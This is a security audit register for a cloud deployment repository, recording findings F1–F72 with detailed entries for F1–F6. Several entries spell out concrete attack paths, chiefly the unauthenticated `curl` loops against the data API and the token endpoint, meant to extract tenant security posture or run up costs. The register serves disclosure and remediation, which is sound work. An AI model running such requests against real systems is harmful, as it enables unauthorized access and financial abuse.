# Pre-publication security review — 2026-08-26

Four auditors reviewed this repo ahead of publication: appsec, infra, supply-chain, and
NIST 800-171. Every claim below was independently re-verified by the controller before
acceptance — reproduced where marked, traced end to end where marked, or confirmed by
direct inspection otherwise. Fifteen findings resulted. This document is the durable
record of them; before it existed, they lived only in a chat transcript.

**F16–F18 addendum (same day):** a second scrub applied two lenses the 800-171 pass did
not — the NIST SP 800-53 Rev 5 moderate-baseline families 800-171 tailors *out* (CM-6,
SI-4, CP-9, IR-4, CP-10) and CMMC 2.0 Level 1's FAR 52.204-21 basic safeguards — against
four candidates the first pass surfaced but never ran down. Three confirmed as real gaps
(F16–F18, below); one (`Standard_LRS` on the cost-export storage account) was checked and
dismissed — see "Deliberately NOT findings."

**Status convention (updated 2026-08-27, Task 23).** Every finding below started life as
GAP — that is what a finding *is*. As remediation tasks closed them, this document's own
per-finding `**Status:**` field is kept in sync with current reality rather than frozen at
discovery-time: a finding reads `CLOSED` once its fix has actually landed, `GAP` for as
long as it has not. This was already the convention F14 onward; Task 23 applied it
retroactively to F1–F13 as well, so the field means the same thing everywhere in this
document now. Each closed finding's `Fix:` section is left as originally written — it
describes what closing the finding required, which is historical context, not a live
claim — and the pointer immediately after `**Status:** CLOSED` names the
`compliance/assessment/*.json` record(s) that carry the full remediation account
(rationale, evidence, and the closing commit SHA) for that control. **No finding in this
document is open.** The most recent to close were [F46](#f46) through
[F72](#f72), all raised and all fixed on 2026-08-29/30 during the first live tenant
bring-up and the first real deployment. Before them, **F13** and **F19** were one problem wearing
two labels: F13's seventh workload RBAC grant had no principal to be written against
because F19 meant `apps/cost-ingest` had no Function App and no identity. Both closed on
2026-08-28 (commit c33f06e), on explicit sponsor authorisation — F19's own Fix text below
says not to build the Function App without that authorisation, and it was given rather
than assumed.

**F25–F36 addendum (2026-08-28, the final pre-publication audit).** Twelve more findings,
raised by a last pass done specifically in the position of *a stranger cloning this repo
and deploying it into their own Azure and Entra tenant* — a lens none of the earlier
passes used. Three are critical ([F25](#f25), [F26](#f26), [F32](#f32)); all twelve are
closed. [F36](#f36) came from turning that same lens on this pass's own output: F25's fix
was correct and left the estate impossible to deploy without manual portal work, which
the stranger lens is exactly what catches. The most important thing this pass demonstrates is not any single finding but a
pattern: **a closed finding's own `Fix:` text can be the bypass** ([F25](#f25)), **a
guard can be asserted and never fire** ([F26](#f26)), and **a test can verify a security
property by matching a comment** ([F27](#f27)). Where a claim turned out to be false, the
claim was corrected rather than quietly deleted — [F28](#f28), [F29](#f29) and
[F35](#f35) changed no code at all, because the documents were the defect. Eight findings
(F14, F15, F19, F20, F21, F22, F29, F36) map to no NIST SP 800-171 control at all, so this
document and the findings-index table's `Closed by` column are their *only* durable record
— there is no `compliance/assessment/` file to additionally point at for those.

**F37–F38 addendum (2026-08-28, after publication).** Two findings that no audit pass
produced, because no reading of this repository could have produced them. Both were
raised by CI checks that had existed but had never executed: [F22](#f22)'s container
smoke test, written the same day, and [F33](#f33)'s Trivy gate, which had been pinned to
an action ref that did not resolve and so had been passing without scanning anything.
[F37](#f37) is a `data-api` image that builds, pushes, scans clean and then cannot start;
[F38](#f38) is three images pinned to an `nginx` tag that stopped receiving base rebuilds
sixteen months ago while keeping its name. Neither was visible in the source tree — one
lived in a container image, the other in a registry's rebuild history. They are the
strongest argument this document makes for its own method: **a gate should be assumed
inert until its first failure proves otherwise**, and running the estate's own checks for
real is not a formality after the audit, it is a distinct audit lens. Both are closed, and
both map to 3.14.1; [F38](#f38) also maps to 3.4.1, which has no
`compliance/assessment/` record of its own — as is already the case for [F30](#f30) and
[F33](#f33).

**F39 (2026-08-28, immediately after).** Turning the F37/F38 lens on the fixes themselves
produced a third finding, and the worst of the three: the two checks that caught them
**could not have blocked either one from merging**. See [F39](#f39). This is the same
shape as [F25](#f25) (a closed finding's own fix text became the bypass) and [F26](#f26)
(a guard asserted and never fired), and it is the third time in this register that the
question worth asking was not "does the control exist" but "what happens when it says
no".

## What this register has learned about verification

Thirty-six of these findings came from reading: audits, reviews, CI, and gates. The eighteen
after them came from **doing the thing once** - standing up a real tenant on 2026-08-29 and
then deploying into it. They are worth reading as one argument, because each widens the same
claim by one step:

| | |
|---|---|
| [F46](#f46) | **Mocks are not the cloud.** 1,352 passing assertions, and the first real tenant produced nine defects in an hour - three of them wrong answers inside the gate whose job is refusing a tenant that is not ready. |
| [F49](#f49) | **A test is not production configuration.** Twelve audit scripts set `Set-StrictMode -Version Latest`; every one of their harnesses turned it off. The suite was thorough inside a language mode the Verifier never runs in. |
| [F51](#f51) | **A gate that never passes is not a gate.** `up.ps1 -DryRun` could not exit 0 on a fresh estate - the one case a plan exists for - so its red result carried no information and was read as wallpaper, including in the run where it sat beside a genuine failure. |
| [F52](#f52) | **A plan is not a deployment.** Three green `what-if` runs preceded a deploy that failed on a policy GUID that does not exist, because what-if computes a resource delta and never resolves a definition id. |
| [F53](#f53) | **A value with more than one source has no source.** The estate's region was written in sixteen places, and the one an operator would naturally set was outranked by fifteen nobody reads. |
| [F56](#f56) | **Code that has run once is not code that runs.** L2 generated a new GUID for a role assignment on every run, so it converged exactly once and was refused ever after - on an estate whose entire premise is tearing itself down and rebuilding. |
| [F57](#f57) | **The Verifier could not see the layer it signs off**, and its retry loop treated "forbidden" as "not yet" - so L2's audit ran the full 60-minute job timeout and produced no report at all | high | CONFIRMED (observed, run 33283413834) | 3.1.5, 3.12.3 | first real L2 audit, 2026-08-30 |
| [F58](#f58) | **A check that cannot report is not a check.** The audit published its transcript only on exit, declared `ran=true` only on exit, ran `az` with no timeout and gave the whole run no retry budget - so every audit that hit the job timeout destroyed the evidence of why. | high | CONFIRMED (observed, run 33287461494) | 3.3.1, 3.12.3 | second L2 audit, 2026-08-30 |
| [F59](#f59) | **Patience inherited is patience nobody chose.** 19 of 47 criteria took a 30-minute retry window by default, including one whose answer was settled the moment the deploy step returned - it spent all thirty minutes reaching a verdict its own run's deploy log contradicted. | high | CONFIRMED (observed, run 33307710207) | 3.12.1, 3.12.3 | first L2 audit report, 2026-08-30 |
| [F61](#f61) | **A failure that always reproduces is not necessarily one failure.** V2.3 wanted compliance data, compliance data needs resources, resources come from L3-L8, and L3-L8 were gated on this audit - so L2 could never pass on the empty estate the demo exists to rebuild. | high | CONFIRMED (measured, 0 resources / 0 summary rows) | 3.12.1, 3.12.3 | L2 audit report, 2026-08-30 |
| [F62](#f62) | **An allowlist that can hide a real identifier is worse than none.** The GUID allowlist file never existed, so V1.3 flagged all 57 ids in the repo and was permanently red; creating it made "add a line" the cheapest way to green, so live ids are now checked against the list first. | medium | CONFIRMED (file absent) | 3.1.1, 3.4.1 | verify-l1, 2026-08-30 |
| [F63](#f63) | **A criterion that fails for reasons outside what it measures is not measuring it.** V1.1 gated the OIDC token exchange on the whole run's conclusion; V1.2 reported secret scanning as off when its token could not read the setting at all. | medium | CONFIRMED (observed, run 33309963273) | 3.12.3, 3.14.6 | verify-l1, 2026-08-30 |
| [F64](#f64) | **Presence is not readiness.** The Graph SDK being installed was taken as being signed in, so every Graph criterion threw while an already-authenticated `az rest` fallback sat unreachable beneath it. | medium | CONFIRMED (observed, run 33309963273) | 3.12.3 | verify-l1, 2026-08-30 |
| [F66](#f66) | **An auditor that acquires write access to close a finding has closed the wrong thing** - and the least-privilege alternative I reached for, a `GITHUB_TOKEN` scoped `administration: read`, is not a permission that exists. V1.2 now SKIPs, naming the one credential that would resolve it. The control was enabled all along. | medium | CONFIRMED (both settings read `enabled` under an admin token; actionlint rejected the invented scope) | 3.1.5, 3.14.6 | verify-l1, 2026-08-30 |
| [F67](#f67) | **When a check and the operation it protects are not asking the same question, the check will pass at exactly the moment it matters.** `Wait-EntraPropagation` confirmed the user and group were VISIBLE; the membership write needs them LINKABLE, and 404'd - killing L3 on its first membership on the first run that ever reached it. | high | CONFIRMED (observed, run 33321360624) | 3.1.1, 3.12.1 | first L3 apply, 2026-08-30 |
| [F68](#f68) | **A repository-wide sweep has no exemption for test data.** The fix for F62's test collision wrote three realistic-looking GUID literals into a fixture; V1.3 flagged them on the next live run, correctly. Generated now, not committed. | low | CONFIRMED (observed, verify-l1 16:14) | 3.1.1, 3.4.1 | verify-l1, 2026-08-30 |
| [F69](#f69) | **A mutation test proves a guard is load bearing; it cannot prove the guard is wired to reality.** F67's retry matched the Graph error code against `Exception.Message`, which never carries it - so a fully tested, triple-mutation-killed fix merged and did nothing, and L3 failed identically. | high | CONFIRMED (observed, run 33323094630 on the commit containing the fix) | 3.1.1, 3.12.1 | second L3 apply, 2026-08-30 |
| [F70](#f70) | **A fix at the call site protects one call; a fix at the choke point protects the class.** F69's retry finally fired - and the run died on the GET one line above it, unprotected. Every call against a just-created directory object can 404. | high | CONFIRMED (observed, run 33324015966) | 3.1.1, 3.12.1 | third L3 apply, 2026-08-30 |
| [F71](#f71) | **Two error predicates were correct only by luck** - matching Graph codes against `Exception.Message`, which happens to contain the numeric token. Found by a sweep in a second, not by a deploy. | medium | CONFIRMED (found by failure-classes.Tests.ps1) | 3.12.1, 3.12.3 | preventive sweep, 2026-08-30 |
| [F72](#f72) | **A layer that stops at its first error makes the discovery rate equal to the deploy rate.** Three ~40-minute runs each returned one finding. L3 now reports every failed item in one run - and still fails. | high | CONFIRMED (runs 33321360624, 33323094630, 33324015966) | 3.12.1 | throughput review, 2026-08-30 |

Two practical rules come out of that, and both earned their place the expensive way.

**Ask where a value comes from, not whether it is correct.** The two costliest defects of the
final day - a fabricated policy GUID ([F52](#f52)) and a region with sixteen sources
([F53](#f53)) - were both surfaced by that question and by nothing else: not by a diff, not
by a failing test, and not by the plan, which was green. A value with one honest source can be
checked; a value with sixteen cannot.

**Failures stack, and only the top one is visible.** The six defects of the first real
deployment were not six mistakes in sequence - each was hidden by the one above it. A
fabricated policy GUID ([F52](#f52)) hid a deployment-record conflict ([F54](#f54)), which
hid an assignment-location conflict ([F55](#f55)), which hid a landing zone that could only
deploy once ([F56](#f56)). No amount of care at any one step reaches the next; only running
it again does. Budget for that shape rather than treating each new error as evidence the
last fix was wrong.

**A constant that names something in another system must be verified against that system.**
Three separate findings are the same mistake in different clothes: the Fabric SKU asserted
three times from memory and documentation before the API said `FTL4` ([F46](#f46)), an OIDC
subject constructed by hand rather than read from GitHub ([F48](#f48)), and a policy
definition id that was never real ([F52](#f52)). Twenty-three such constants are pinned in
this repository. Exactly one was wrong, which is why nothing noticed: the other twenty-two
made the practice look safe.

And the uncomfortable summary of the whole exercise: **five of the six defects the first
real deployment found had never executed even once before it.** `up.ps1 -DryRun` had been run
repeatedly and reported green every time. A plan validates a template; it does not create a
policy assignment, register a managed identity, or replay a role grant, so it cannot reach
any of them. The green plan was not wrong - it was answering a different question than the
one anyone was asking of it.

---

## Index

| # | Finding | Severity | Confidence | Controls | Closed by |
|---|---|---|---|---|---|
| [F1](#f1) | data-api: public internet, zero inbound auth — **closed incompletely; see [F25](#f25)** | critical | CONFIRMED | 3.1.1, 3.1.2, 3.13.1 | Task 6, then F25 |
| [F2](#f2) | MCP auth gate inert in the shipped configuration | critical | CONFIRMED | 3.1.1, 3.5.1, 3.13.1 | Tasks 4, 5 |
| [F3](#f3) | Direct Line token endpoint fails open twice | high | CONFIRMED | 3.1.1, 3.5.1 | Task 7 |
| [F4](#f4) | App Insights key + subscription inventory in a public job summary | high | CONFIRMED | 3.1.3, 3.13.16 | Task 8 |
| [F5](#f5) | lint-ci node leg dead — npm test never runs in CI | high | CONFIRMED (reproduced) | 3.12.3, 3.14.1 | Task 3 |
| [F6](#f6) | mls-verifier has no federated credential | high | CONFIRMED | 3.12.1, 3.12.3 | Task 9 |
| [F7](#f7) | `environment: demo` mints an Owner-capable OIDC subject | high | CONFIRMED | 3.1.5, 3.1.6, 3.1.7 | Task 9 |
| [F8](#f8) | Application.ReadWrite.All on the deployer | high | CONFIRMED | 3.1.5 | Task 10 |
| [F9](#f9) | Zero diagnosticSettings anywhere in the estate | high | CONFIRMED | 3.3.1, 3.3.2, 3.3.5 | Task 13 |
| [F10](#f10) | NIST policy identity holds standing Contributor | medium | CONFIRMED | 3.1.5 | Task 11 |
| [F11](#f11) | `javascript:` href accepted in Adaptive Cards; no CSP | high | CONFIRMED (path traced end to end) | 3.14.1 | Task 14 |
| [F12](#f12) | SQL gate: unterminated comment/quote swallows the tail | medium | CONFIRMED (reproduced) | 3.14.1 | Task 15 |
| [F13](#f13) | Zero workload RBAC expressed in IaC | high | CONFIRMED | 3.1.1, 3.1.2, 3.1.5 | Task 12, then F24, then F19 |
| [F14](#f14) | self-heal branch-squatting kill switch + missing ref filter | medium | CONFIRMED | — (availability) | Task 16 |
| [F15](#f15) | Cost export non-functional | medium | CONFIRMED | — (cost control) | Task 17 |
| [F16](#f16) | Azure SQL backup posture never decided or verified | medium | CONFIRMED | CP-9 | Task 18 |
| [F17](#f17) | Zero alert rules or action groups anywhere in the estate | high | CONFIRMED | SI-4, IR-4 | Task 19 |
| [F18](#f18) | Sensitivity labels published nowhere — a taxonomy, not a control | medium | CONFIRMED | CM-6 | Task 20 |
| [F19](#f19) | cost-ingest documented as deployed; deploys nowhere | medium | CONFIRMED | — (availability/completeness) | F19 remediation (commit c33f06e) |
| [F20](#f20) | data-api's contained-user grant is expressed but never applies | medium | CONFIRMED | — (availability) | Task 22 |
| [F21](#f21) | mls-verifier's documented Fabric workspace Viewer grant does not exist | high | CONFIRMED | — (availability — breaks the Verifier's sign-off gate) | Task 21 |
| [F22](#f22) | Container images never smoke-tested in CI | medium | CONFIRMED | — (availability) | Task 24 |
| [F23](#f23) | Three G3 full-tenant teardown scripts the runbooks instruct operators to run did not exist | high | CONFIRMED | CM-6 | Task 25 |
| [F24](#f24) | data-api's Fabric workspace Viewer grant expressed but never invoked | high | CONFIRMED | 3.1.1, 3.1.2, 3.1.5 | final branch review |
| [F25](#f25) | data-api internet-reachable and unauthenticated **through both public frontends** — F1's fix was incomplete and its own text was the bypass | critical | CONFIRMED | 3.1.1, 3.1.2, 3.13.1 | final pre-publication audit |
| [F26](#f26) | Easy Auth guard never fires: a `readEnvironmentVariable` default is unreachable when a workflow feeds it from `vars.*` | critical | CONFIRMED (reproduced) | 3.1.1, 3.13.1 | final pre-publication audit |
| [F27](#f27) | Least-privilege verified by matching **comments**; zero of the matched strings are executable Bicep | high | CONFIRMED | 3.1.1, 3.1.2, 3.1.5 | final pre-publication audit |
| [F28](#f28) | "No secrets in CI" is false — six long-lived credentials, and the rotation list in the incident-response text named one | high | CONFIRMED | 3.1.3, 3.5.1 | final pre-publication audit |
| [F29](#f29) | self-heal's auto-merge "gauntlet" names two legs that structurally cannot run on a heal PR | medium | CONFIRMED | — (unattended-merge justification) | final pre-publication audit |
| [F30](#f30) | `sbom.yml`: `contents: write` in the same job as `npm ci` of known-CVE packages and a floating action | high | CONFIRMED | 3.4.1, 3.14.1 | final pre-publication audit |
| [F31](#f31) | L9 disables a Defender plan it did not enable, reported as "a spend decrease, so no gate applies" | high | CONFIRMED | SI-4 | final pre-publication audit |
| [F32](#f32) | Purview teardown deletes an adopter's **real** `Confidential` label; the apply path rewrites it | critical | CONFIRMED | CM-6, 3.8.4 | final pre-publication audit |
| [F33](#f33) | Zero of 263 `uses:` SHA-pinned; `aquasecurity/trivy-action@0.28.0` resolves to no ref at all | medium | CONFIRMED | 3.4.1 | final pre-publication audit |
| [F34](#f34) | `.superpowers/` (3.3 MB of transcripts) excluded only by a nested ignore file | medium | CONFIRMED | 3.1.3 | final pre-publication audit |
| [F35](#f35) | Subscription-wide DENY policy nowhere stated as requiring a dedicated, empty subscription | medium | CONFIRMED | CM-6 | final pre-publication audit |
| [F36](#f36) | F25's fix made the estate undeployable: L7 refused to run without three hand-set client IDs, and the redirect URIs could not exist until it had | high | CONFIRMED | — (availability/adoptability) | final pre-publication audit |
| [F37](#f37) | The `data-api` image cannot start: the runtime stage copies only the hoisted `node_modules`, and five of its non-dev packages are not hoisted — the same pin also held a `runtime`-scope CVE in the tree | high | CONFIRMED (reproduced in CI) | 3.14.1 | F22's smoke test, first run |
| [F38](#f38) | Three shipped images sat sixteen months behind Alpine's security updates on an end-of-line `nginx` tag, and no ecosystem was watching `FROM` lines | medium | CONFIRMED | 3.4.1, 3.14.1 | F33's Trivy repin, first real scan |
| [F39](#f39) | The Trivy CRITICAL gate and the F22 smoke test were **advisory**: not one of the five image jobs was a required status check | high | CONFIRMED | 3.4.3, 3.14.1 | raised and closed with F37/F38 |
| [F40](#f40) | `dependabot.yml` told adopters to switch OFF the only fix generator the seeded CVEs have — known-wrong and left in place for four days | medium | CONFIRMED | — (adoptability; L10 showpiece) | raised and closed with F39 |
| [F41](#f41) | The compliance state artifact became its own trigger: seven orphaned branches, and `main`'s state stamped seven commits behind | medium | CONFIRMED (observed) | 3.12.3 | raised and closed 2026-08-29 |
| [F42](#f42) | Polynomial ReDoS in the inbound `Authorization` parse — the gate in front of a deliberately public endpoint | high | CONFIRMED (measured) | 3.13.1, 3.14.1 | CodeQL, raised and closed 2026-08-29 |
| [F43](#f43) | The G0 gate's own definition asserts two verifications `verify-g0.ps1` does not perform, and `PURVIEW_APP_ID` was documented nowhere | high | CONFIRMED | — (adoptability; blocks nothing until the clock is running, then costs days) | G0 rehearsal, 2026-08-29 |
| [F44](#f44) | The published leadership brief still carried F28's exact false claim — "continuous integration holds no secret at all" | high | CONFIRMED | 3.1.3 | doc refresh, 2026-08-29 |
| [F45](#f45) | All fourteen labels `dependabot.yml` declares were never created, so every Dependabot PR carried an error comment — 42 of them | low | CONFIRMED (counted) | — (operability) | raised and closed 2026-08-29 |
| [F46](#f46) | Nine defects the first real tenant exposed in an hour, including **three wrong results in the G0 gate itself** — two false fails and a false pass | high | CONFIRMED (observed against a live tenant) | 3.12.3, 3.14.1 | tenant bring-up, 2026-08-29 |
| [F47](#f47) | L2 deployed at the **tenant root** management group, so the first live plan run failed and the documented remedy was Global Administrator elevation plus a standing root-scope Owner service principal - neither of which L2 ever needed | high | CONFIRMED (observed, run 33264310126) | 3.1.2, 3.1.5 | first live plan run, 2026-08-29 |
| [F48](#f48) | `01-root-oidc.ps1` built the OIDC subject claim by hand, but GitHub now presents an **immutable-identifier** subject - so the first real federated login failed and every workflow was locked out of Azure | high | CONFIRMED (AADSTS700213, then green) | 3.5.1, 3.5.2 | first live OIDC login, 2026-08-29 |
| [F49](#f49) | The Verifier crashed before evaluating a single criterion, and its own 535-test suite could not see it: **12 audit scripts run `Set-StrictMode -Version Latest`; 13 test harnesses ran `Set-StrictMode -Off`** | high | CONFIRMED (observed in CI, reproduced, mutation-tested) | 3.12.1, 3.12.3 | verify-l1 failures on main, 2026-08-29 |
| [F50](#f50) | `Policy.ReadWrite.ConditionalAccess` does not imply READ for an application permission, so L3 could author Conditional Access policies it was forbidden to look at - and died on the idempotency read before reaching the write it did have rights for | high | CONFIRMED (403 against the live tenant) | 3.1.2, 3.5.2 | first L3 plan, 2026-08-29 |
| [F51](#f51) | `up.ps1 -DryRun` could never exit 0: L7 what-ifs against a resource group that only a real L6 creates, so the plan always failed and its exit code carried no information | medium | CONFIRMED (every plan run to date) | - (operability; the plan is the pre-deploy gate) | plan runs, 2026-08-29 |
| [F52](#f52) | Five defects the first real deployment exposed, including a **fabricated policy GUID three `what-if` runs passed** and a fail-fast gate where a skipped layer launders into a success, so L2 failed and L6 built 13 resources anyway | high | CONFIRMED (observed, run 33272832687) | 3.12.1, 3.12.3 | first real deploy, 2026-08-29 |
| [F53](#f53) | The estate region was hardcoded in **16 places** and the workflow input silently outvoted `vars.AZURE_LOCATION`, so setting the environment variable did nothing and the next deploy went back to the region that cannot host it | high | CONFIRMED (observed, run 33275398487 cancelled) | 3.4.1, 3.4.2 | sponsor question, 2026-08-29 |
| [F54](#f54) | A management-group deployment location is immutable, so changing `AZURE_LOCATION` wedges L2 permanently - ten simultaneous Conflicts on names the template must keep stable | medium | CONFIRMED (observed, run 33277220471) | 3.4.2 | region change, 2026-08-29 |
| [F55](#f55) | A policy assignment location is immutable too, so the region change needed **sixteen assignments deleted** - a G3 action on a management group whose only Owner is the deployer, leaving the human sponsor unable to perform it | high | CONFIRMED (observed, run 33277577651) | 3.4.2, 3.1.5 | region change, 2026-08-29 |
| [F56](#f56) | **L2 was not idempotent**: AVM regenerates the modify policies' Tag Contributor grant name every run, so the layer deployed once and failed `RoleAssignmentExists` on every replay - fatal for a kill/rebuild estate | high | CONFIRMED (observed, run 33282406046) | 3.4.2, 3.12.1 | region change, 2026-08-30 |

F19–F21 were surfaced building Task 12 (F13's closing task), same day as the rest of this register. All three are the same shape as F2 and F18 — a document asserting something the code never does — but none is a CUI-protection gap the way F1–F13 are, so none maps to an 800-171 control; they are recorded here for the same reason F14/F15 (which also map to no control) are tracked in this document rather than falling through the gap between the security and compliance framings. F22 was surfaced by the Task 14 review and is the same class as F5 — a CI gap meaning something is never actually exercised, not a document mismatch — but it likewise maps to no 800-171 control, so it is tracked here for the same reason. F23 was surfaced by the Task 20 review and generalised by a repo-wide teardown census; unlike F19–F22 it DOES map to a control (CM-6, the same one F18 maps to) and it is the only finding in this register that also violates a CLAUDE.md hard rule directly (the deploy/teardown/audit triplet).

---

## F1

**data-api: public internet, zero inbound auth**

- **Severity:** critical
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.1.2, 3.13.1
- **Closed by:** Task 6 (**incompletely** — finished by [F25](#f25))
- **Status:** CLOSED, but only since F25
- **Remediation record:** `compliance/assessment/3.1.1.json`, `compliance/assessment/3.1.2.json`, `compliance/assessment/3.13.1.json`

> **Correction (final pre-publication audit).** Task 6's fix was necessary and not
> sufficient, and **the `Fix:` line at the bottom of this entry was the bypass**. Making
> data-api internal does not make it unreachable while `control-tower` and `launch-ops`
> are externally reachable, unauthenticated, and blind-proxying `/api/` to it — which is
> exactly what "both frontends already proxy `/api/` server-side" describes.
> `GET https://<control-tower-fqdn>/api/feeds/secure-score` still reached data-api with no
> credential, and still returned the adopter's live Defender for Cloud posture. This entry
> read `CLOSED` for a day while a reader could copy the exploit out of its own fix text.
> The hole is closed by **[F25](#f25)**, which puts Easy Auth on both frontends; the `Fix:`
> line below is left as written, because what it says is the finding.

**Where:** `apps/data-api/src/app.ts:56` ("there is deliberately no Authorization here");
`app.ts:67-169` (middleware chain — requestId, securityHeaders, cors, requestSpan,
readOnlyGuard, no auth layer); `infra/bicep/apps/main.bicep:334` (`ingressExternal: true`).

**Attack path:** read the FQDN from the layer-07 public job summary, or proxy through
control-tower's nginx `/api/*`. Then `GET /feeds/secure-score` (live Defender posture),
`/feeds/dependabot-alerts` (not public even on a public repo), `/feeds/app-requests` (Log
Analytics results). Then loop `curl ".../tables/launches?limit=10000"`.

**Impact:** unauthenticated disclosure of tenant security posture, plus the worst cost
path in the estate. Each request wakes the app AND touches `GP_S_Gen5` serverless SQL with
`autoPauseDelay: 60`. One request every 59 minutes from anywhere holds it online at min 0.5
vCore, about $0.26/hr or $188/month. No flood needed. `maxReplicas: 2` caps ACA, not
upstreams.

**Note:** CORS is correctly NOT treated as authorization — `app.ts:199` calls that
"security theatre", which is right about CORS. Nothing replaced it.

**Fix:** `ingressExternal: false`; both frontends already proxy `/api/` server-side.

---

## F2

**MCP auth gate inert in the shipped configuration**

- **Severity:** critical
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.5.1, 3.13.1
- **Closed by:** Tasks 4, 5
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.1.1.json`, `compliance/assessment/3.5.1.json`, `compliance/assessment/3.13.1.json`

**Where:** `apps/mcp-tools/src/auth-gate.ts:123-147` (throws only when
`backendMode === 'cloud'`); `config.ts:156` (`env.MLS_TOOL_BACKENDS ?? "local"`);
`infra/bicep/apps/main.bicep` (mcpToolsApp sets three env vars; `MLS_TOOL_BACKENDS` is set
NOWHERE in `infra/` or `.github/`); `demo.bicepparam` (`mcpAuthToken` defaults to empty).

**Attack path:** FQDN plus `POST /mcp` with a JSON-RPC `tools/call`, no credential.

**Impact:** today the local adapters serve fixtures so disclosure is nil — but the control
the repo advertises most prominently reads as present and is not, and a later cloud switch
inherits `enforced: false`. `/healthz` publishes `auth: { enforced: false }` to anyone. The
boot banner prints the REASSURING branch ("local mode; set MCP_AUTH_TOKEN") because the
loud warning is reachable only via `deliberatelyOpen`.

**Also:** `grep -rn MCP_AUTH_TOKEN .github/` returns nothing — the Key Vault to workflow to
deploy chain asserted by `demo.bicepparam`'s comment and g0-bootstrap.md C11 does not
exist.

**Fix:** enforce unless explicitly opted out (invert the default); set
`MLS_TOOL_BACKENDS` explicitly; resolve the token via `keyVaultUrl` + UAMI, not a secure
param.

---

## F3

**Direct Line token endpoint: unauthenticated faucet, fails open twice**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.5.1
- **Closed by:** Task 7
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.1.1.json`, `compliance/assessment/3.5.1.json`

**Where:** `apps/directline-token/src/functions/directline-token.mjs:60-67`, `:94-99`:
`if (allowed.length > 0 && origin && !allowed.includes(origin)) return 403`

Two fail-open conditions in one line:
1. No `Origin` header → `origin` undefined → guard skipped → token minted. Browsers always
   send it on cross-origin POST; curl never has to.
2. `DIRECTLINE_ALLOWED_ORIGINS` unset → `allowed.length === 0` → guard skipped AND
   `trustedOrigins` passed as undefined to `exchangeSecretForToken` (line 74), so the
   minted token carries no origin binding either. No boot-time check that the variable is
   set.

**Attack path:** `curl -X POST .../api/directline/token` with no Origin returns 200 and a
valid token. Open a conversation, loop questions. Each turn runs the agent, which calls
the MCP tools, which hit Fabric SQL, Log Analytics, ARM Cost Management and the GitHub
Security API.

**Critical:** **this path holds the MCP token**, so F2's gate is irrelevant to it — the
attacker never needs one. Compounding wallet drain across Copilot Studio credits and
Fabric CU.

**Note:** the header comment cites "Functions platform rate limiting" as a control;
`host.json` configures no throttling and `authLevel` is `"anonymous"`.

**Fix:** refuse when `allowed.length === 0` (500, not configured); refuse when `!origin`
(403).

---

## F4

**App Insights ingestion key and subscription inventory in a public job summary**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.3, 3.13.16
- **Closed by:** Task 8
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.1.3.json`, `compliance/assessment/3.13.16.json`

**Where:** `infra/bicep/platform/main.bicep:344` (`output appInsightsConnectionString`,
annotated "not a secret"); `.github/workflows/layer-06-platform.yml:192-197`
(`cat l6-manifest.json >> $GITHUB_STEP_SUMMARY`) and `:299-304` (artifact upload).
`layer-07-apps.yml` does the same with `l7-manifest.json`.

**Key fact:** job summaries and artifacts on a PUBLIC repo are readable without
authentication. The string carries `InstrumentationKey=<guid>`, and AVM
`insights/component@0.8.0` defaults `disableLocalAuth: false` (`main.bicep:175-185` does
not override) — that key alone authorises telemetry ingestion from anywhere on the
internet.

**Impact, integrity:** an attacker injects arbitrary traces, exceptions and metrics into
the workspace backing control-tower's Dev/Sec/Ops tabs. The security dashboard becomes
attacker-writable, and it corrupts the estate's only audit trail.

**Impact, disclosure:** the same manifest publishes `keyVaultUri`, `sqlServerFqdn`,
`costExportStorageResourceId`, `lawCustomerId` and — inside every resource ID — the
SUBSCRIPTION ID, which CLAUDE.md hard rule 5 says lives in GitHub environment variables
and is never committed.

**Bounded by:** `lawDailyQuotaGb: '1'` (`platform/main.bicep:95`), capping ingestion at
about $2.50/day.

**Fix:** delete the output — nothing consumes it, `apps/main.bicep:218-221` reads the
component as `existing`; set `disableLocalAuth: true` and grant the two UAMIs Monitoring
Metrics Publisher; summarise selected keys instead of `cat`-ing the manifest; drop the
artifact upload.

---

## F5

**lint-ci node leg dead: npm test never runs in CI**

- **Severity:** high
- **Confidence:** CONFIRMED (reproduced)
- **Controls:** 3.12.3, 3.14.1
- **Closed by:** Task 3
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.12.3.json`, `compliance/assessment/3.14.1.json`

**Where:** `.github/workflows/lint-ci.yml:196-202` —
`for script in .github/scripts/*.mjs; do node --check "${script}"; done` under
`set -euo pipefail`. `.github/scripts/` was DELETED by the 2026-08-24 amendment
(`.github/README.md:135` says so).

**Reproduced:** no `nullglob`, so bash passes the literal glob, `node --check` exits 1,
and `set -e` kills the step. "LOOP COMPLETED" never prints.

**Impact:** it is the FIRST step of the node job, so `npm ci`, `npm run build`,
`npm run typecheck`, `npm test` across 7 workspaces, and the vuln-lab CVE-seed integrity
check (`:216-234`) never run. The JS/TS test gate is absent, not merely failing.

**Live risk:** required checks are about to be chosen "after the first CI run", so a
permanently-red job gets left off the list, removing `npm test` from the auto-merge
gauntlet permanently.

**Fix:** delete the step. Do NOT "fix" it with `nullglob` — a step that silently checks
nothing is worse than no step.

---

## F6

**mls-verifier has no federated credential**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.12.1, 3.12.3
- **Closed by:** Task 9
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.12.1.json`, `compliance/assessment/3.12.3.json`

**Where:** `scripts/bootstrap/01-root-oidc.ps1` — `Initialize-FederatedCredential` is
called exactly twice, `:352` and `:354`, BOTH with `$deployer.id`. The verifier block
(`:372-382`) creates the app, SP, Reader role and Graph roles, and no credential. Nothing
else in the repo creates one.

**Impact:** every `azure/login` with `AZURE_VERIFIER_CLIENT_ID` fails `AADSTS70021`. Every
layer's verify job fails at login. `verify-g0.ps1:203-209` (`Test-VerifierApp`) only
checks the app REGISTRATION exists, so G0 reports green on a verifier that cannot
authenticate. CLAUDE.md's core control — "a layer is DONE only on the Verifier's
sign-off, running as mls-verifier (Reader), never as the deployer SP" — is
unimplementable as shipped.

**Fix:** create the FIC with a subject DISTINCT from the deployer's; extend
`Test-VerifierApp` to assert both the credential and the distinctness.
